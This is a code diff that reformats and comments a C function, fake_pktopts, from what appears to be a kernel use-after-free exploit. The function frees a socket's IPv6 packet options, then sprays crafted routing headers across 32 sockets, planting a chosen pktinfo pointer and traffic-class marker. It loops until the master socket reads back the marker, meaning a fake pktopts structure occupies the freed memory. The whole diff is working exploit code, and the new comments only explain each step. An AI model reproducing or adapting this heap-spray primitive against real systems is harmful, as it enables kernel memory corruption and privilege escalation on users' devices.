@@ -143,28 +143,50 @@ int build_rthdr_msg(char* buf, int size)
 #define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
 #define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
 
-int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo)
-{
+int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
+    // Call free_pktopts to free the packet options associated with overlap_sock
     free_pktopts(overlap_sock);
+    
+    // Initialize a buffer of size 0x100 (256 bytes) with all zeros,
+    // then build a routing header message in buf, with length 0x100, 
+    // and store its length in l, and msg in buf
     char buf[0x100] = {0};
     int l = build_rthdr_msg(buf, 0x100);
+    
+    // Declare an integer to hold traffic class value
     int tclass;
-    for(;;)
-    {
-        for(int i = 0; i < 32; i++)
-        {
+
+    // Enter an infinite loop
+    for (;;) {
+        // Loop through 32 spray sockets
+        for(int i = 0; i < 32; i++) {
+            // Set pktinfo at the specified offset in buf
             *(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
+            
+            // Set traffic class at the specified offset in buf with tclass0 OR-ed with i
             *(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
-            if(set_rthdr(o->spray_sock[i], buf, l))
-                *(volatile int*)0;
+
+            // Set the routing header with the modified buf for the i-th spray socket
+            if (set_rthdr(o->spray_sock[i], buf, l))
+                 *(volatile int*)0; 
         }
+        
+        // Get the current traffic class of the master socket
         tclass = get_tclass(o->master_sock);
-        if((tclass & 0xffff0000) == tclass0)
-            break;
-        for(int i = 0; i < 32; i++)
-            if(set_rthdr(o->spray_sock[i], NULL, 0))
-                *(volatile int*)0;
+        
+        // Check if the upper 16 bits of tclass match tclass0
+        // If they match, exit the infinite loop
+        if ((tclass & 0xffff0000) == tclass0) break;
+        
+        // Loop through the 32 spray sockets again
+        for (int i = 0; i < 32; i++) {
+             // Reset the routing header for the i-th spray socket by setting it to NULL
+             if (set_rthdr(o->spray_sock[i], NULL, 0))
+                 *(volatile int*)0;
+        }
     }
+    
+    // Return the lower 16 bits of the traffic class
     return tclass & 0xffff;
 }
 
